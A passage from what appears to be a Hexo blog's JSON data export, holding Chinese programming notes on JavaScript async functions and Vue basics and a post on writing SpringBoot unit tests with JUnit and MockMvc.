class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">func1</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">&#x27;func1 return&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">func2</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// await func1().then((data) =&gt; console.log(data));</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">&#x27;func2 return&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">func2</span>().<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Promise</span>.<span class=\"title function_\">all</span>([<span class=\"title function_\">func1</span>(), <span class=\"title function_\">func2</span>()]).<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Vue\"><a href=\"#Vue\" class=\"headerlink\" title=\"Vue\"></a>Vue</h1><h2 id=\"特殊变量\"><a href=\"#特殊变量\" class=\"headerlink\" title=\"特殊变量\"></a>特殊变量</h2><ol>\n<li>观察变量</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">watch</span>: &#123;</span><br><span class=\"line\">  <span class=\"attr\">a</span>: <span class=\"function\">(<span class=\"params\">newVal</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`watch:<span class=\"subst\">$&#123;newVal&#125;</span>`</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>实时计算变量</li>\n</ol>\n<ul>\n<li>不能在 data 里声明</li>\n<li>必须在 computed 里面声明</li>\n<li>需要在 view 里面使用</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">computed</span>: &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"router\"><a href=\"#router\" class=\"headerlink\" title=\"router\"></a>router</h2><ul>\n<li>定义好组件（用户页）</li>\n<li>把用户页和路由地址（Path）一一对应，这个对应的管理工作就是 router</li>\n<li>再把 router 配置到 vue 对象上，一起挂载到 DOM 对象</li>\n<li>view 需要有 router-view 及 router-link</li>\n</ul>\n<h2 id=\"vuex\"><a href=\"#vuex\" class=\"headerlink\" title=\"vuex\"></a>vuex</h2><ul>\n<li>声明全局状态</li>\n<li>读：<ul>\n<li>getter</li>\n<li>mapper 映射+Computed</li>\n</ul>\n</li>\n<li>写：<ul>\n<li>dispatch(action)，组件上使用</li>\n<li>action(commit) -&gt; 允许异步</li>\n<li>mutation -&gt; 同步，修改状态</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"vue-组件生命周期\"><a href=\"#vue-组件生命周期\" class=\"headerlink\" title=\"vue 组件生命周期\"></a>vue 组件生命周期</h2><ul>\n<li>初始化阶段：beforeCreate、created、beforeMount、mounted</li>\n<li>运行中：beforeUpdate、updated</li>\n<li>销毁阶段：beforeDestroy、destroyed</li>\n</ul>\n<h2 id=\"vue3\"><a href=\"#vue3\" class=\"headerlink\" title=\"vue3\"></a>vue3</h2><ol>\n<li>响应式数据声明</li>\n</ol>\n<ul>\n<li>ref，声明基础数据类型</li>\n<li>reactive，声明复杂数据类型</li>\n</ul>\n<ol start=\"2\">\n<li>setup</li>\n</ol>"},{"layout":"pages","title":"SpringBoot单元测试","date":"2022-08-05T01:14:04.000Z","_content":"\n> 学会写单元测试应该也是程序员的基本功，但可惜我之前压根没动过念头，\n> 经过这么久才开始接触单元测试，我觉得自己实在是废了。\n\n<!--more-->\n\n# 需要的依赖\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-test</artifactId>\n  <scope>test</scope>\n</dependency>\n```\n\n# 实践\n\n可以写一个测试类，在里面定义每个单元测试需要做的操作。\n\n```java\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.springframework.boot.test.context.SpringBootTest;\n\n@SpringBootTest\npublic class BaseTests {\n    /**\n     * @description 执行测试之前的操作\n     * @return\n     * @date 2022/8/21 10:39\n     * @author neonat\n     */\n    @BeforeEach\n    public void before() {\n        System.out.println(\"start testing\");\n        setMockMvc();\n    }\n\n    /**\n     * @description 执行测试之后的操作\n     * @return\n     * @date 2022/8/21 10:39\n     * @author neonat\n     */\n    @AfterEach\n    public void after() {\n        System.out.println(\"end testing\");\n    }\n}\n```\n\n# 单元测试内模拟发送 Http 请求\n\n1. 通过 MockMVC 对象\n\n```java\n/**\n * @description 测试Test类\n * @date 2022/8/21 10:38\n * @author neonat\n * @version 1.0.0\n */\n@SpringBootTest\nclass DemoApplicationTests {\n\n    @Autowired\n    private WebApplicationContext webApplicationContext;\n\n    // 伪造MVC环境，不会启动tomcat，速度更快\n    protected MockMvc mockMvc;\n\n    /**\n     * @description 在测试之前注册mockMVC\n     * @return\n     * @date 2022/8/20 17:10\n     * @author neonat\n     */\n    public void setMockMvc() {\n        mockMvc = MockMvcBuilders.webAppContextSetup(webApplicationContext).build();\n    }\n\n    /**\n     * @description 测试带参数的get请求\n     * @return\n     * @date 2022/8/21 10:37\n     * @author neonat\n     */\n    @Test\n    void testMore() throws Exception {\n        MvcResult result = mockMvc.perform(MockMvcRequestBuilders\n                        .get(\"/test/more\")// get请求\n                        .param(\"integer\", \"12\")// 参数\n                        .contentType(MediaType.APPLICATION_JSON)// 返回类型\n                )\n                .andExpect(MockMvcResultMatchers.status().isOk())// 期望返回结果正确\n                .andReturn();\n        // 打印返回内容\n        System.out.println(result.getResponse().getContentAsString());\n    }\n}\n```\n\n2. 通过 RestTemplate 远程调用\n\n```java\n// example cann't run, leave it for next time\n```\n\n# 其他事项\n\n## 测试类无法启动原因\n\n1. 需要写启动类；\n2. 启动类所在的包要和单元测试所在的包在同一级根目录下。\n\n## @Value 和@Autowired 注解不生效\n\n使用过程中发现`@Value` 和 `@Autowired` 注解不生效，测试运行的对象注入值为 null。\n\n以下为文章分析原因：\n\nSpring 中，实例由容器管理，测试类中，容器因为没有对应的上下文，没有办法进行注入类的实例化操作，因此需要提供一个上下文环境给测试类，即添加如下两个注解到测试类。\n\n```java\n@RunWith(SpringRunner.class) //意指让程序运行于Spring测试环境\n@SpringBootTest(classes = HiveDeal.class) //给测试类提供上下文环境\n```\n\n注解说明：\n`@RunWith` 类级别注解，提供了一种更改测试运行程序的默认机制。可以根据指定的类运行程序，指定的类必须是 `Runner` 类的子类。\n`@SpringBootTest` 通过这个注解，可以使 `JUnit` 单元测试执行在 `SpringBoot` 环境中，提供上下文环境。\n\n但是我实际使用过程中发现 `@Autowired` 里面再调用 `@Autowired` ，还是不能实现连续自动装配，尝试将多个类都放在 `@SpringBootTest` 中提供上下文环境，还是有问题，就算没出错也很繁琐，最后只能将上下文环境放在启动类中，但是这样使用测试实例时就是完完全全启动一个 SpringBoot 应用了，很重，暂时没有什么好的办法。\n\n# 参考文章\n\n- [springboot 测试类](https://blog.csdn.net/lihuihui01/article/details/115975416)\n- [用 SpringBoot 单元测试如何模拟发送 HTTP 请求](https://blog.csdn.net/qq_35746632/article/details/100108651)\n- [springboot 单元测试（get 请求）](https://blog.csdn.net/qq_44014971/article/details/108056557)\n- [SpringBoot 单元测试，@Value 注解执行不生效问题解决，测试类依赖注入实例失败问题解决](https://blog.csdn.net/MDJ_D2T/article/details/123779419)\n","source":"_posts/2022/08/SpringBoot单元测试.md","raw":"---\nlayout: pages\ntitle: SpringBoot单元测试\ndate: 2022-08-05 09:14:04\ntags:\n  - Java\n  - SpringBoot\ncategories:\n  - Java\n  - SpringBoot\n---\n\n> 学会写单元测试应该也是程序员的基本功，但可惜我之前压根没动过念头，\n> 经过这么久才开始接触单元测试，我觉得自己实在是废了。\n\n<!--more-->\n\n# 需要的依赖\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-test</artifactId>\n  <scope>test</scope>\n</dependency>\n```\n\n# 实践\n\n可以写一个测试类，在里面定义每个单元测试需要做的操作。\n\n```java\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.springframework.boot.test.context.SpringBootTest;\n\n@SpringBootTest\npublic class BaseTests {\n    /**\n     * @description 执行测试之前的操作\n     * @return\n     * @date 2022/8/21 10:39\n     * @author neonat\n     */\n    @BeforeEach\n    public void before() {\n        System.out.println(\"start testing\");\n        setMockMvc();\n    }\n\n    /**\n     * @description 执行测试之后的操作\n     * @return\n     * @date 2022/8/21 10:39\n     * @author neonat\n     */\n    @AfterEach\n    public void after() {\n        System.out.println(\"end testing\");\n    }\n}\n```\n\n# 单元测试内模拟发送 Http 请求\n\n1. 通过 MockMVC 对象\n\n```java\n/**\n * @description 测试Test类\n * @date 2022/8/21 10:38\n * @author neonat\n * @version 1.0.0\n */\n@SpringBootTest\nclass DemoApplicationTests {\n\n    @Autowired\n    private WebApplicationContext webApplicationContext;\n\n    // 伪造MVC环境，不会启动tomcat，速度更快\n    protected MockMvc mockMvc;\n\n    /**\n     * @description 在测试之前注册mockMVC\n     * @return\n     * @date 2022/8/20 17:10\n     * @author neonat\n     */\n    public void setMockMvc() {\n        mockMvc = MockMvcBuilders.webAppContextSetup(webApplicationContext).build();\n    }\n\n    /**\n     * @description 测试带参数的get请求\n     * @return\n     * @date 2022/8/21 10:37\n     * @author neonat\n     */\n    @Test\n    void testMore() throws Exception {\n        MvcResult result = mockMvc.perform(MockMvcRequestBuilders\n                        .get(\"/test/more\")// get请求\n                        .param(\"integer\", \"12\")// 参数\n                        .contentType(MediaType.APPLICATION_JSON)// 返回类型\n                )\n                .andExpect(MockMvcResultMatchers.status().isOk())// 期望返回结果正确\n                .andReturn();\n        // 打印返回内容\n        System.out.println(result.getResponse().getContentAsString());\n    }\n}\n```\n\n2. 通过 RestTemplate 远程调用\n\n```java\n// example cann't run, leave it for next time\n```\n\n# 其他事项\n\n## 测试类无法启动原因\n\n1. 需要写启动类；\n2. 启动类所在的包要和单元测试所在的包在同一级根目录下。\n\n## @Value 和@Autowired 注解不生效\n\n使用过程中发现`@Value` 和 `@Autowired` 注解不生效，测试运行的对象注入值为 null。\n\n以下为文章分析原因：\n\nSpring 中，实例由容器管理，测试类中，容器因为没有对应的上下文，没有办法进行注入类的实例化操作，因此需要提供一个上下文环境给测试类，即添加如下两个注解到测试类。\n\n```java\n@RunWith(SpringRunner.class) //意指让程序运行于Spring测试环境\n@SpringBootTest(classes = HiveDeal.class) //给测试类提供上下文环境\n```\n\n注解说明：\n`@RunWith` 类级别注解，提供了一种更改测试运行程序的默认机制。可以根据指定的类运行程序，指定的类必须是 `Runner` 类的子类。\n`@SpringBootTest` 通过这个注解，可以使 `JUnit` 单元测试执行在 `SpringBoot` 环境中，提供上下文环境。\n\n但是我实际使用过程中发现 `@Autowired` 里面再调用 `@Autowired` ，还是不能实现连续自动装配，尝试将多个类都放在 `@SpringBootTest` 中提供上下文环境，还是有问题，就算没出错也很繁琐，最后只能将上下文环境放在启动类中，但是这样使用测试实例时就是完完全全启动一个 SpringBoot 应用了，很重，暂时没有什么好的办法。\n\n# 参考文章\n\n- [springboot 测试类](https://blog.csdn.net/lihuihui01/article/details/115975416)\n- [用 SpringBoot 单元测试如何模拟发送 HTTP 请求](https://blog.csdn.net/qq_35746632/article/details/100108651)\n- [springboot 单元测试（get 请求）](https://blog.csdn.net/qq_44014971/article/details/108056557)\n- [SpringBoot 单元测试，@Value 注解执行不生效问题解决，测试类依赖注入实例失败问题解决](https://blog.csdn.net/MDJ_D2T/article/details/123779419)\n","slug":"2022/08/SpringBoot单元测试","published":1,"updated":"2022-09-26T15:30:46.393Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj4001qzge3fsod0iuj","content":"<blockquote>\n<p>学会写单元测试应该也是程序员的基本功，但可惜我之前压根没动过念头，<br>经过这么久才开始接触单元测试，我觉得自己实在是废了。</p>\n</blockquote>\n<span id=\"more\"></span>\n\n<h1 id=\"需要的依赖\"><a href=\"#需要的依赖\" class=\"headerlink\" title=\"需要的依赖\"></a>需要的依赖</h1><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-test<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"实践\"><a href=\"#实践\" class=\"headerlink\" title=\"实践\"></a>实践</h1><p>可以写一个测试类，在里面定义每个单元测试需要做的操作。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.junit.jupiter.api.AfterEach;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.junit.jupiter.api.BeforeEach;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@SpringBootTest</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BaseTests</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@description</span> 执行测试之前的操作</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@date</span> 2022/8/21 10:39</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@author</span> neonat</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@BeforeEach</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">before</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;start testing&quot;</span>);</span><br><span class=\"line\">        setMockMvc();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@description</span> 执行测试之后的操作</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@date</span> 2022/8/21 10:39</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@author</span> neonat</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@AfterEach</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">after</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;end testing&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"单元测试内模拟发送-Http-请求\"><a href=\"#单元测试内模拟发送-Http-请求\" class=\"headerlink\" title=\"单元测试内模拟发送 Http 请求\"></a>单元测试内模拟发送 Http 请求</h1><ol>\n<li>通过 MockMVC 对象</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@description</span> 测试Test类</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@date</span> 2022/8/21 10:38</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@author</span> neonat</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@version</span> 1.0.0</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SpringBootTest</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DemoApplicationTests</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> WebApplicationContext webApplicationContext;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 伪造MVC环境，不会启动tomcat，速度更快</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> MockMvc mockMvc;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@description</span> 在测试之前注册mockMVC</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@date</span> 2022/8/20 17:10</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@author</span> neonat</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setMockMvc</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        mockMvc = MockMvcBuilders.webAppContextSetup(webApplicationContext).build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@description</span> 测试带参数的get请求</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@date</span> 2022/8/21 10:37</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@author</span> neonat</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">testMore</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">MvcResult</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> mockMvc.perform(MockMvcRequestBuilders</span><br><span class=\"line\">                        .get(<span class=\"string\">&quot;/test/more&quot;</span>)<span class=\"comment\">// get请求</span></span><br><span class=\"line\">                        .param(<span class=\"string\">&quot;integer&quot;</span>, <span class=\"string\">&quot;12&quot;</span>)<span class=\"comment\">// 参数</span></span><br><span class=\"line\">                        .contentType(MediaType.APPLICATION_JSON)<span class=\"comment\">// 返回类型</span></span><br><span class=\"line\">                )</span><br><span class=\"line\">                .andExpect(MockMvcResultMatchers.status().isOk())<span class=\"comment\">// 期望返回结果正确</span></span><br><span class=\"line\">                .andReturn();</span><br><span class=\"line\">        <span class=\"comment\">// 打印返回内容</span></span><br><span class=\"line\">        System.out.println(result.getResponse().getContentAsString());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>通过 RestTemplate 远程调用</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// example cann&#x27;t run, leave it for next time</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"其他事项\"><a href=\"#其他事项\" class=\"headerlink\" title=\"其他事项\"></a>其他事项</h1><h2 id=\"测试类无法启动原因\"><a href=\"#测试类无法启动原因\" class=\"headerlink\" title=\"测试类无法启动原因\"></a>测试类无法启动原因</h2><ol>\n<li>需要写启动类；</li>\n<li>启动类所在的包要和单元测试所在的包在同一级根目录下。</li>\n</ol>\n<h2 id=\"Value-和-Autowired-注解不生效\"><a href=\"#Value-和-Autowired-注解不生效\" class=\"headerlink\" title=\"@Value 和@Autowired 注解不生效\"></a>@Value 和@Autowired 注解不生效</h2><p>使用过程中发现<code>@Value</code> 和 <code>@Autowired</code> 注解不生效，测试运行的对象注入值为 null。</p>\n<p>以下为文章分析原因：</p>\n<p>Spring 中，实例由容器管理，测试类中，容器因为没有对应的上下文，没有办法进行注入类的实例化操作，因此需要提供一个上下文环境给测试类，即添加如下两个注解到测试类。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RunWith(SpringRunner.class)</span> <span class=\"comment\">//意指让程序运行于Spring测试环境</span></span><br><span class=\"line\"><span class=\"meta\">@SpringBootTest(classes = HiveDeal.class)</span> <span class=\"comment\">//给测试类提供上下文环境</span></span><br></pre></td></tr></table></figure>\n\n<p>注解说明：<br><code>@RunWith</code> 类级别注解，提供了一种更改测试运行程序的默认机制。可以根据指定的类运行程序，指定的类必须是 <code>Runner</code> 类的子类。<br><code>@SpringBootTest</code> 通过这个注解，可以使 <code>JUnit</code> 单元测试执行在 <code>SpringBoot</code> 环境中，提供上下文环境。</p>\n<p>但是我实际使用过程中发现 <code>@Autowired</code> 里面再调用 <code>@Autowired</code> ，还是不能实现连续自动装配，尝试将多个类都放在 <code>@SpringBootTest</code> 中提供上下文环境，还是有问题，就算没出错也很繁琐，最后只能将上下文环境放在启动类中，但是这样使用测试实例时就是完完全全启动一个 SpringBoot 应用了，很重，暂时没有什么好的办法。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://blog.csdn.net/lihuihui01/article/details/115975416\">springboot 测试类</a></li>\n<li><a href=\"https://blog.csdn.net/qq_35746632/article/details/100108651\">用 SpringBoot 单元测试如何模拟发送 HTTP 请求</a></li>\n<li><a href=\"https://blog.csdn.net/qq_44014971/article/details/108056557\">springboot 单元测试（get 请求）</a></li>\n<li><a href=\"https://blog.csdn.net/MDJ_D2T/article/details/123779419\">SpringBoot 单元测试，@Value 注解执行不生效问题解决，测试类依赖注入实例失败问题解决</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>学会写单元测试应该也是程序员的基本功，但可惜我之前压根没动过念头，<br>经过这么久才开始接触单元测试，我觉得自己实在是废了。</p>\n</blockquote>","more":"<h1 id=\"需要的依赖\"><a href=\"#需要的依赖\" class=\"headerlink\" title=\"需要的依赖\"></a>需要的依赖</h1><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-test<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"实践\"><a href=\"#实践\" class=\"headerlink\" title=\"实践\"></a>实践</h1><p>可以写一个测试类，在里面定义每个单元测试需要做的操作。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.junit.jupiter.api.AfterEach;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.junit.jupiter.api.BeforeEach;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@SpringBootTest</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BaseTests</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@description</span> 执行测试之前的操作</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@date</span> 2022/8/21 10:39</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@author</span> neonat</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@BeforeEach</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span 